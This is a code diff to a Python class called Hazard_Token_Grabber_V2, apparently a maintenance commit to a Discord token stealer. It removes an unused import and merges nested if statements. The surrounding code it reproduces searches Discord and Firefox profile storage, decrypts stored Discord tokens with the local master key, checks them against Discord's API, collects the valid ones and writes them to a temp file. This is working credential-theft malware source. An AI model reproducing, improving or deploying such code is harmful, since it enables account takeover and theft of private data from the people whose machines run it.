@@ -1,5 +1,4 @@
 import os
-from numpy import append
 import requests
 import shutil
 import sqlite3
@@ -290,9 +289,8 @@ class Hazard_Token_Grabber_V2:
                                     r = requests.get(self.baseurl, headers=self.getheaders(token))
                                 except Exception:
                                     pass
-                                if r.status_code == 200:
-                                    if token not in self.tokens:
-                                        self.tokens.append(token)
+                                if r.status_code == 200 and token not in self.tokens:
+                                    self.tokens.append(token)
             else:
                 if os.path.exists(self.roaming+'\\discord\\Local State'):
                     for file_name in os.listdir(path):
@@ -302,9 +300,8 @@ class Hazard_Token_Grabber_V2:
                             for y in findall(self.encrypted_regex, line):
                                 token = self.decrypt_password(base64.b64decode(y[:y.find('"')].split('dQw4w9WgXcQ:')[1]), self.get_master_key(self.roaming+'\\discord\\Local State'))
                                 r = requests.get(self.baseurl, headers=self.getheaders(token))
-                                if r.status_code == 200:
-                                    if token not in self.tokens:
-                                        self.tokens.append(token)
+                                if r.status_code == 200 and token not in self.tokens:
+                                    self.tokens.append(token)
 
         if os.path.exists(self.roaming+"\\Mozilla\\Firefox\\Profiles"):
             for path, _, files in os.walk(self.roaming+"\\Mozilla\\Firefox\\Profiles"):
@@ -318,9 +315,8 @@ class Hazard_Token_Grabber_V2:
                                     r = requests.get(self.baseurl, headers=self.getheaders(token))
                                 except Exception:
                                     pass
-                                if r.status_code == 200:
-                                    if token not in self.tokens:
-                                        self.tokens.append(token)
+                                if r.status_code == 200 and token not in self.tokens:
+                                    self.tokens.append(token)
               
     def neatifyTokens(self):
         f = open(self.tempfolder+"\\Discord Info.txt", "w", encoding="cp437", errors='ignore')
